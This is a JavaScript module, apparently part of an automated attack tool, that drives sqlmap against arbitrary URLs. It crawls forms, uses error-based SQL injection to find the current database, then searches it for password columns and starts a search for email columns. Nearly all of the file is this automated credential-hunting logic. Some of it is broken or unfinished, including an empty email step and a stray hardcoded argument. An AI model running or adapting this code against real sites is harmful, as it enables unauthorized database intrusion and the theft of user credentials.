'use strict';

const fs = require('fs');
const path = require('path');
const config = require('./config');
const util = require('util');
const cp = require('child_process');
const Promise = require('../modules/bluebird');

class Worker {

  static _parseVersion(str) {
    let arr = str.trim().split(' ');
    if (arr.length < 2) {
      return null;
    }
    let version = arr[1];
    version = version.split('.').splice(0, 2).join('');
    return version;
  };

  static getPythonVersion(cb) {
    const cmd = 'python --version';
    cp.exec(cmd, (err, stdout, stderr) => {
      if (err) {
        cb(err);
      }
      let version = this._parseVersion(stderr);
      cb(null, version);
    });
  }

  static _getOutputDirPath() {
    const outputDir = config.outputDir;
    const cwd = process.cwd();
    const str = path.join(cwd, outputDir).toString();
    return str;
  }

  static _getDBNameArgs(url) {
    return [config.sqlmapPath,
            '-u', url,
            '--current-db',
            '--batch',
            '--answers', 'do you want to dump entries?=N',
            '--crawl=1',
            '--forms',
            '--smart',
            '--technique=E',
            util.format('--output-dir=%s',
                        this._getOutputDirPath()).toString()];
  }

  static _extractDBName(line) {
    const start = line.indexOf('\'');
    const end = line.lastIndexOf('\'');
    if (start === -1 || end === -1 || start === end) {
      console.log(line);
      return null;
    }
    const result = line.substring(start + 1, end);
    return result;
  }

  static _getPostData(host) {
    const outputDir = config.outputDir;
    const cwd = process.cwd();
    const str = path.join(cwd, outputDir).toString();

    const filePath = path.join(this._getOutputDirPath(),
                               host, 'target.txt').toString();
    console.log('path is: %s', filePath);
    const result = {

    };
    try {
      const arr = fs.readFileSync(filePath).toString().trim().split('\n');
      const arr1 = [];
      for (let i = 0; i < arr.length; i++) {
        const line = arr[i].trim();
        if (line.length === 0) {
          continue;
        }
        arr1.push(line);
      }
      const url = arr1[0].split(' ')[0];
      let postData = null;
      if (arr1.length > 1) {
        postData = arr1[1];
      }
      result.url = url;
      result.postData = postData;
    } catch (e) {
      console.log(e);
      result.err = e;
    }
    return result;
  }

  static getDBName(url, cb) {
    const args = this._getDBNameArgs(url);
    console.log(process.cwd());
    console.log(config.sqlmapPath);
    console.log(args);
    const sqlmap = cp.spawn('python', args, {
      detached: false
    });
    for (let i = 0; i < 20; i++) {
      sqlmap.stdin.write('\n');
    }
    sqlmap.stdin.end();

    let stderr = '';
    sqlmap.stderr.on('data', d => {
      stderr += d.toString();
    });
    let stdout = '';
    let dbName = null;
    let newUrl = null;
    let postData = null;
    let err = null;

    sqlmap.stdout.on('data', d => {
      console.log('data is: %s', d.toString());
      stdout += d.toString();
      const arr = stdout.split('\n');
      for (let i = 0; i < arr.length; i++) {
        const line = arr[i];
        if (line.indexOf('current database: ') === -1) {
          continue;
        }
        dbName = this._extractDBName(line);
        const result = this._getPostData(url);
        postData = result.postData;
        newUrl = result.url;
        if (!newUrl) {
          const err = result.err;
        }
        console.log('postdata is: ');
        console.log(result);
        sqlmap.kill();
        break;
      }
      stdout = arr[arr.length - 1];
    });

    sqlmap.on('error', err => {
      if (dbName) {
        cb(null, {
          db: dbName,
          url: newUrl,
          postData: postData
        });
      } else {
        cb(err);
      }
      cb = function() { };
    });

    sqlmap.on('exit', () => {
      console.log('closedddddddddddd');
      cb(null, {
        db: dbName,
        url: newUrl,
        postData: postData
      });
      cb = function() { };
    });
    sqlmap.on('error', () => {
      console.log('closedddddddddddd err');
      cb(null, {
        db: dbName,
        url: newUrl,
        postData: postData
      });
      cb = function() { };
    });

    sqlmap.stdout.on('error', err => {
      console.log(err);
    });
    sqlmap.stderr.on('error', err => {
      console.log(err);
    });
    sqlmap.on('error', err => {
      console.log(err);
      cb(err);
    });

  }

  static _getPasswordTableArgs(url, postData, DBName) {
    if (!postData) {
      postData = '';
    }

    return [
      config.sqlmapPath,
      '-u', url,
      postData,
      ' to separate words&biaoname=wz_en&nr=All',
      '--technique=E',
      '--smart',
      '-D', DBName,
      '--search',
      '-C', 'password',
      '--batch',
      '--answers',
      'do you want to dump entries?=N',
      util.format('--output-dir=%s',
                  this._getOutputDirPath()).toString()
    ];
  }

  static _parsePasswordTable(tableStr) {
    console.log('table str is: ');
    console.log(tableStr);
    tableStr = tableStr.trim();
    const l = tableStr.split('\n');
    l.splice(0, 1);
    const table = l[0].split(' ')[1];
    l.splice(0, 5);
    l.pop();
    const result = {
      'table_name': table
    };
    const columns = [];
    for (let i = 0; i < l.length; i++) {
      const line = l[i].split('|');
      if (line.length <= 1) {
	continue;
      }
      const columnName = line[1].trim();
      columns.push(columnName);
    }
    result['columns'] = columns;
    return result;
  }

  static getPasswordTables(url, postData, DBName, cb) {
    const args = this._getPasswordTableArgs(url, postData, DBName);
    console.log(process.cwd());
    console.log(config.sqlmapPath);
    console.log(args);

    const sqlmap = cp.spawn('python', args, {
      detached: false
    });

    for (let i = 0; i < 20; i++) {
      sqlmap.stdin.write('\n');
    }
    sqlmap.stdin.end();

    let stderr = '';
    sqlmap.stderr.on('data', d => {
      stderr += d.toString();
    });

    let stdout = '';
    sqlmap.stdout.on('data', d => {
      console.log('data is: %s', d.toString());
      stdout += d.toString();
    });


    let parseResults = () => {
      const start = 'found in the following databases:';
      const startInd = stdout.indexOf(start);
      if (startInd === -1) {
	cb(null, null);
	return;
      }
      stdout = stdout.substring(startInd + start.length);
      const end = 'do you want to dump entries?';
      let endInd = stdout.indexOf(end);
      if (endInd === -1) {
	console.log('invalid output');
	cb(null, null);
	return;
      }
      stdout = stdout.substring(0, endInd).trim();
      const list = stdout.split('Database:');
      const tables = [];
      for (let i = 0; i < list.length; i++) {
	const item = list[i];
	if (item.length === 0) {
	  continue;
	}
	const table = this._parsePasswordTable(item);
	tables.push(table);
      }
      cb(null, tables);
    };

    sqlmap.on('error', err => {
      parseResults();
      parseResults = function() { };
    });
    sqlmap.on('close', () => {
      parseResults();
      parseResults = function() { };
    });

    sqlmap.stdout.on('error', err => {
    });
    sqlmap.stderr.on('error', err => {
    });

  }

  static _getEmailColumnArgs(url, postData, DBName, tableName) {
    if (!postData) {
      postData = '';
    }
    return [
      config.sqlmapPath,
      '-u', url,
      postData,
      '-D', DBName,
      '-T', tableName,
      '--search', '-C', 'email',
      '--technique=E', '--smart',
      '--batch', '--answers',
      'do you want to dump entries?=N',
      util.format('--output-dir=%s',
                  this._getOutputDirPath()).toString()
    ];
  }
  

  static getEmailColumns(url, postData, DBName, tableName) {
    const args = this._getEmailColumnArgs(url, postData, DBName, tableName);
  }
  

};

(function() {
  Promise.promisifyAll(Worker, {
    filter: function() {
      return true;
    }
  });
}());

module.exports = Worker;
